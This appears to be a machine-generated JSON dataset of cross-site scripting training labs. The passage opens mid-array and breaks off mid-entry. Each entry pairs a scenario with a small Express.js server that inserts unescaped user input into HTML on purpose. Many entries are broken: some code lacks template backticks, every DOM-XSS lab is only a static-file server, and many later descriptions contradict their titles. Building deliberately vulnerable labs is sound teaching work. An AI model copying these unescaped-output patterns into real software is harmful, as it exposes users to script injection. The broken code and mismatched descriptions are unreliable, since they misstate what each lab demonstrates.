    "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\nlet posts = [];\n\napp.post('/create-post', (req, res) => {\n    posts.push(req.body.title);\n    res.send('Post created!');\n});\n\napp.get('/posts', (req, res) => {\n    res.send(posts.map(p => <h2>${p}</h2>).join(''));\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in product search",
    "Lab Description": "The product search page reflects user input in the results page without sanitization, leading to a reflected XSS vulnerability.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "easy",
    "src code": "const express = require('express');\nconst app = express();\n\napp.get('/search', (req, res) => {\n    const query = req.query.q || '';\n    res.send(<h1>Search Results</h1><p>You searched for: ${query}</p>);\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Stored XSS in guestbook comments",
    "Lab Description": "Users can leave comments in the guestbook, but they are stored and displayed without sanitization, allowing for stored XSS attacks.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\nlet comments = [];\n\napp.post('/comment', (req, res) => {\n    comments.push(req.body.comment);\n    res.send('Comment added!');\n});\n\napp.get('/guestbook', (req, res) => {\n    res.send(comments.map(c => <p>${c}</p>).join(''));\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "DOM XSS in user dashboard",
    "Lab Description": "The user dashboard updates the UI dynamically using JavaScript, but fails to properly escape user-generated input, leading to a DOM-based XSS vulnerability.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in contact form error message",
    "Lab Description": "The contact form displays error messages that include user input without sanitization, allowing for a reflected XSS attack.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "easy",
    "src code": "const express = require('express');\nconst app = express();\n\napp.get('/contact', (req, res) => {\n    const error = req.query.error || '';\n    res.send(<h1>Contact Form</h1><p>${error}</p>);\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Stored XSS in user avatars",
    "Lab Description": "Users can upload custom avatars, but the image URL is stored and displayed without sanitization, allowing for stored XSS.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\nlet avatars = [];\n\napp.post('/upload-avatar', (req, res) => {\n    avatars.push(req.body.avatarUrl);\n    res.send('Avatar uploaded!');\n});\n\napp.get('/avatars', (req, res) => {\n    res.send(avatars.map(a => <img src=\"${a}\" />).join(''));\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "DOM XSS in chat messages",
    "Lab Description": "Chat messages are displayed dynamically using JavaScript without proper escaping, leading to a DOM-based XSS vulnerability.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in help desk ticketing system",
    "Lab Description": "The ticketing system reflects error messages without sanitization, allowing for reflected XSS.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst app = express();\n\napp.get('/helpdesk', (req, res) => {\n    const error = req.query.error || 'No issues detected';\n    res.send(<h1>Help Desk</h1><p>${error}</p>);\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Stored XSS in product reviews",
    "Lab Description": "Product reviews are stored and displayed without proper sanitization, allowing for stored XSS attacks.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\nlet reviews = [];\n\napp.post('/review', (req, res) => {\n    reviews.push(req.body.review);\n    res.send('Review submitted!');\n});\n\napp.get('/reviews', (req, res) => {\n    res.send(reviews.map(r => <p>${r}</p>).join(''));\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in search suggestions",
    "Lab Description": "The search suggestions page displays user input without sanitization, leading to reflected XSS.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "easy",
    "src code": "const express = require('express');\nconst app = express();\n\napp.get('/suggestions', (req, res) => {\n    const query = req.query.q || '';\n    res.send(<h1>Search Suggestions</h1><p>${query}</p>);\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Stored XSS in forum signatures",
    "Lab Description": "Forum signatures are stored and displayed without proper sanitization, allowing attackers to inject malicious scripts.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\nlet signatures = [];\n\napp.post('/signature', (req, res) => {\n    signatures.push(req.body.signature);\n    res.send('Signature updated!');\n});\n\napp.get('/signatures', (req, res) => {\n    res.send(signatures.map(s => <p>${s}</p>).join(''));\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in admin panel search",
    "Lab Description": "The admin panel search function reflects user input in the response without escaping, allowing reflected XSS.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst app = express();\n\napp.get('/admin-search', (req, res) => {\n    const query = req.query.q || 'No query';\n    res.send(`<h1>Admin Search</h1><p>Results for: ${query}</p>`);\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Stored XSS in profile picture URL",
    "Lab Description": "Users can set profile picture URLs, but input is not validated, allowing stored XSS by injecting a JavaScript URL.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\nlet profiles = {};\n\napp.post('/set-avatar', (req, res) => {\n    profiles[req.body.username] = req.body.avatar;\n    res.send('Avatar updated!');\n});\n\napp.get('/avatar', (req, res) => {\n    const avatar = profiles[req.query.username] || 'default.jpg';\n    res.send(`<img src=\"${avatar}\" />`);\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in search results",
    "Lab Description": "The search results page reflects user queries without escaping, allowing for reflected XSS.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "easy",
    "src code": "const express = require('express');\nconst app = express();\n\napp.get('/search', (req, res) => {\n    const query = req.query.q || 'No query provided';\n    res.send(`<h1>Search Results</h1><p>You searched for: ${query}</p>`);\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Stored XSS in guestbook messages",
    "Lab Description": "The guestbook allows users to leave messages, but input is not sanitized, leading to stored XSS.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\nlet messages = [];\n\napp.post('/guestbook', (req, res) => {\n    messages.push(req.body.message);\n    res.send('Message added!');\n});\n\napp.get('/guestbook', (req, res) => {\n    res.send(messages.map(m => `<p>${m}</p>`).join(''));\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "DOM XSS in chat system",
    "Lab Description": "The chat system dynamically updates messages using JavaScript but does not escape user input, leading to DOM-based XSS.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in signup error message",
    "Lab Description": "The signup form returns error messages that include unsanitized user input, allowing for reflected XSS.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "easy",
    "src code": "const express = require('express');\nconst app = express();\n\napp.get('/signup', (req, res) => {\n    const error = req.query.error || '';\n    res.send(`<h1>Signup Page</h1><p>${error}</p>`);\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Stored XSS in forum threads",
    "Lab Description": "Users can create forum threads, but their input is stored and displayed without sanitization, leading to stored XSS.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\nlet threads = [];\n\napp.post('/forum', (req, res) => {\n    threads.push(req.body.thread);\n    res.send('Thread created!');\n});\n\napp.get('/threads', (req, res) => {\n    res.send(threads.map(t => `<p>${t}</p>`).join(''));\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in profile preview",
    "Lab Description": "The profile preview feature reflects user input in the page without sanitization, allowing for reflected XSS.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst app = express();\n\napp.get('/profile-preview', (req, res) => {\n    const name = req.query.name || 'Guest';\n    res.send(`<h1>Profile Preview</h1><p>Name: ${name}</p>`);\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Stored XSS in event registration",
    "Lab Description": "Users can register for events, but input is stored and displayed without sanitization, leading to stored XSS.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\nlet registrations = [];\n\napp.post('/register', (req, res) => {\n    registrations.push(req.body.name);\n    res.send('Registered successfully!');\n});\n\napp.get('/registrations', (req, res) => {\n    res.send(registrations.map(r => `<p>${r}</p>`).join(''));\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "DOM XSS in search suggestions",
    "Lab Description": "Search suggestions are updated dynamically using JavaScript but do not escape user input, allowing for DOM-based XSS.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in file upload preview",
    "Lab Description": "The file upload preview page displays filenames without sanitization, allowing for reflected XSS.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "easy",
    "src code": "const express = require('express');\nconst app = express();\n\napp.get('/upload-preview', (req, res) => {\n    const filename = req.query.file || 'No file uploaded';\n    res.send(`<h1>Upload Preview</h1><p>Filename: ${filename}</p>`);\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Stored XSS in admin announcements",
    "Lab Description": "Admin announcements are stored and displayed without sanitization, leading to stored XSS vulnerabilities.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\nlet announcements = [];\n\napp.post('/announcement', (req, res) => {\n    announcements.push(req.body.announcement);\n    res.send('Announcement posted!');\n});\n\napp.get('/announcements', (req, res) => {\n    res.send(announcements.map(a => `<p>${a}</p>`).join(''));\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in help desk ticket submission",
    "Lab Description": "The help desk system displays user input from the ticket form in the response without escaping, leading to reflected XSS.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst app = express();\n\napp.get('/helpdesk', (req, res) => {\n    const issue = req.query.issue || 'No issue provided';\n    res.send(`<h1>Help Desk</h1><p>Issue: ${issue}</p>`);\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Stored XSS in shopping cart comments",
    "Lab Description": "Users can leave comments on items in their shopping cart, but the application does not sanitize input, allowing stored XSS.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\nlet cartComments = [];\n\napp.post('/cart-comment', (req, res) => {\n    cartComments.push(req.body.comment);\n    res.send('Comment added!');\n});\n\napp.get('/cart-comments', (req, res) => {\n    res.send(cartComments.map(c => `<p>${c}</p>`).join(''));\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "DOM XSS in notification system",
    "Lab Description": "The notification panel updates dynamically using JavaScript without escaping user input, leading to DOM-based XSS.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in password recovery hint",
    "Lab Description": "The password recovery page displays user input in a hint message without escaping, allowing reflected XSS.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "easy",
    "src code": "const express = require('express');\nconst app = express();\n\napp.get('/recover-password', (req, res) => {\n    const hint = req.query.hint || 'No hint available';\n    res.send(`<h1>Password Recovery</h1><p>Hint: ${hint}</p>`);\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Stored XSS in leaderboard names",
    "Lab Description": "Users can set their leaderboard name, but input is stored without sanitization, allowing stored XSS.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\nlet leaderboard = [];\n\napp.post('/leaderboard', (req, res) => {\n    leaderboard.push(req.body.name);\n    res.send('Name added to leaderboard!');\n});\n\napp.get('/leaderboard', (req, res) => {\n    res.send(leaderboard.map(n => `<p>${n}</p>`).join(''));\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in newsletter subscription form",
    "Lab Description": "The newsletter subscription page displays user-provided emails in a confirmation message without escaping, leading to reflected XSS.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "easy",
    "src code": "const express = require('express');\nconst app = express();\n\napp.get('/subscribe', (req, res) => {\n    const email = req.query.email || 'No email provided';\n    res.send(`<h1>Newsletter Subscription</h1><p>Subscribed with: ${email}</p>`);\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Stored XSS in online polls",
    "Lab Description": "Users can create poll options, but input is stored and displayed without sanitization, allowing stored XSS.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\nlet polls = [];\n\napp.post('/poll', (req, res) => {\n    polls.push(req.body.option);\n    res.send('Poll option added!');\n});\n\napp.get('/polls', (req, res) => {\n    res.send(polls.map(p => `<p>${p}</p>`).join(''));\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in event registration form",
    "Lab Description": "The event registration page displays user-provided names in a confirmation message without escaping, leading to reflected XSS.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "easy",
    "src code": "const express = require('express');\nconst app = express();\n\napp.get('/register', (req, res) => {\n    const name = req.query.name || 'No name provided';\n    res.send(`<h1>Event Registration</h1><p>Registered as: ${name}</p>`);\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Stored XSS in customer support chat",
    "Lab Description": "Chat messages sent to customer support are stored without escaping, allowing stored XSS.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\nlet supportMessages = [];\n\napp.post('/support-chat', (req, res) => {\n    supportMessages.push(req.body.message);\n    res.send('Message sent!');\n});\n\napp.get('/support-messages', (req, res) => {\n    res.send(supportMessages.map(m => `<p>${m}</p>`).join(''));\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in API error messages",
    "Lab Description": "The API error response includes user-provided input without escaping, making it vulnerable to reflected XSS.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst app = express();\n\napp.get('/api-error', (req, res) => {\n    const error = req.query.msg || 'Unknown error';\n    res.send(`<h1>API Error</h1><p>${error}</p>`);\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in support ticket subject",
    "Lab Description": "The support ticket submission page reflects user input in the subject line without escaping, allowing reflected XSS.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst app = express();\n\napp.get('/support', (req, res) => {\n    const subject = req.query.subject || 'No subject provided';\n    res.send(`<h1>Support Ticket</h1><p>Subject: ${subject}</p>`);\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Stored XSS in social media posts",
    "Lab Description": "Users can post updates on a social media page, but the application does not sanitize input, allowing stored XSS.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\nlet posts = [];\n\napp.post('/post', (req, res) => {\n    posts.push(req.body.content);\n    res.send('Post created!');\n});\n\napp.get('/posts', (req, res) => {\n    res.send(posts.map(p => `<p>${p}</p>`).join(''));\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "DOM XSS in notifications panel",
    "Lab Description": "The notifications panel updates dynamically using JavaScript but does not sanitize input, leading to DOM-based XSS.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in booking confirmation",
    "Lab Description": "The booking confirmation page displays user input without escaping, leading to reflected XSS.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "easy",
    "src code": "const express = require('express');\nconst app = express();\n\napp.get('/booking', (req, res) => {\n    const bookingName = req.query.name || 'No name provided';\n    res.send(`<h1>Booking Confirmation</h1><p>Booked under: ${bookingName}</p>`);\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Stored XSS in game chat messages",
    "Lab Description": "Players can send chat messages in an online game, but input is stored without escaping, allowing stored XSS.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\nlet chatMessages = [];\n\napp.post('/game-chat', (req, res) => {\n    chatMessages.push(req.body.message);\n    res.send('Message sent!');\n});\n\napp.get('/chat-messages', (req, res) => {\n    res.send(chatMessages.map(m => `<p>${m}</p>`).join(''));\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in user dashboard",
    "Lab Description": "User input displayed in the dashboard without escaping can lead to reflected XSS attacks.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst app = express();\n\napp.get('/dashboard', (req, res) => {\n    const username = req.query.username || 'Guest';\n    res.send(`<h1>Dashboard</h1><p>Welcome, ${username}</p>`);\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Stored XSS in public comments",
    "Lab Description": "Users can leave public comments, but the application does not sanitize input, leading to stored XSS vulnerabilities.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\nlet comments = [];\n\napp.post('/public-comment', (req, res) => {\n    comments.push(req.body.comment);\n    res.send('Comment added!');\n});\n\napp.get('/comments', (req, res) => {\n    res.send(comments.map(c => `<p>${c}</p>`).join(''));\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "DOM XSS in event registration system",
    "Lab Description": "The event registration system dynamically updates content without escaping, leading to DOM-based XSS.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in API error responses",
    "Lab Description": "The API error messages reflect user input without escaping, making it vulnerable to reflected XSS.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst app = express();\n\napp.get('/api-error', (req, res) => {\n    const errorMsg = req.query.msg || 'Unknown error';\n    res.send(`<h1>API Error</h1><p>${errorMsg}</p>`);\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Stored XSS in online surveys",
    "Lab Description": "Users can submit responses to surveys, but the responses are stored without escaping, leading to stored XSS vulnerabilities.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.urlencoded({ extended: true }));\nlet surveyResponses = [];\n\napp.post('/survey', (req, res) => {\n    surveyResponses.push(req.body.response);\n    res.send('Response recorded!');\n});\n\napp.get('/responses', (req, res) => {\n    res.send(surveyResponses.map(r => `<p>${r}</p>`).join(''));\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in chat support system",
    "Lab Description": "The chat support system reflects user input in messages without sanitization, leading to a reflected XSS vulnerability.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst app = express();\n\napp.get('/chat-support', (req, res) => {\n    const message = req.query.message || 'Hello!';\n    res.send(`<h1>Chat Support</h1><p>${message}</p>`);\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "DOM-based XSS in search autocomplete",
    "Lab Description": "The search autocomplete feature updates suggestions dynamically without sanitizing user input, leading to a DOM-based XSS vulnerability.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Stored XSS in admin dashboard notifications",
    "Lab Description": "The admin dashboard displays user-generated notifications without escaping input, leading to stored XSS.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst app = express();\nlet notifications = [];\n\napp.post('/notify', (req, res) => {\n    notifications.push(req.body.notification);\n    res.send('Notification sent!');\n});\n\napp.get('/dashboard', (req, res) => {\n    res.send(notifications.map(n => `<p>${n}</p>`).join(''));\n});\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in order tracking page",
    "Lab Description": "This lab demonstrates a reflected XSS vulnerability in reflected xss in order tracking page.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Stored XSS in user-generated FAQ responses",
    "Lab Description": "This lab demonstrates a reflected XSS vulnerability in stored xss in user-generated faq responses.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "DOM XSS in helpdesk chat widget",
    "Lab Description": "This lab demonstrates a reflected XSS vulnerability in dom xss in helpdesk chat widget.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in coupon code validation",
    "Lab Description": "This lab demonstrates a DOM-based XSS vulnerability in reflected xss in coupon code validation.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Stored XSS in event comments section",
    "Lab Description": "This lab demonstrates a stored XSS vulnerability in stored xss in event comments section.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "DOM XSS in AJAX-based profile updates",
    "Lab Description": "This lab demonstrates a DOM-based XSS vulnerability in dom xss in ajax-based profile updates.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "easy",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in email confirmation page",
    "Lab Description": "This lab demonstrates a reflected XSS vulnerability in reflected xss in email confirmation page.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Stored XSS in feedback ratings",
    "Lab Description": "This lab demonstrates a reflected XSS vulnerability in stored xss in feedback ratings.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "DOM XSS in user profile display",
    "Lab Description": "This lab demonstrates a reflected XSS vulnerability in dom xss in user profile display.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in appointment booking system",
    "Lab Description": "This lab demonstrates a stored XSS vulnerability in reflected xss in appointment booking system.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Stored XSS in shopping cart notes",
    "Lab Description": "This lab demonstrates a stored XSS vulnerability in stored xss in shopping cart notes.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "DOM XSS in customer reviews",
    "Lab Description": "This lab demonstrates a DOM-based XSS vulnerability in dom xss in customer reviews.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "easy",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in ticket booking system",
    "Lab Description": "This lab demonstrates a DOM-based XSS vulnerability in reflected xss in ticket booking system.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Stored XSS in live support messages",
    "Lab Description": "This lab demonstrates a reflected XSS vulnerability in stored xss in live support messages.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "hard",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "DOM XSS in admin panel logs",
    "Lab Description": "This lab demonstrates a stored XSS vulnerability in dom xss in admin panel logs.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "easy",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Reflected XSS in order cancellation page",
    "Lab Description": "This lab demonstrates a stored XSS vulnerability in reflected xss in order cancellation page.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "Stored XSS in collaborative document editor",
    "Lab Description": "This lab demonstrates a stored XSS vulnerability in stored xss in collaborative document editor.",
    "Vulnerability name": "Cross-site scripting",
    "lab level": "medium",
    "src code": "const express = require('express');\nconst app = express();\n\napp.use(express.static('public'));\n\napp.listen(3000, () => console.log('Lab running on http://localhost:3000'));"
},
{
    "Lab scenario": "DOM XSS in file preview feature",
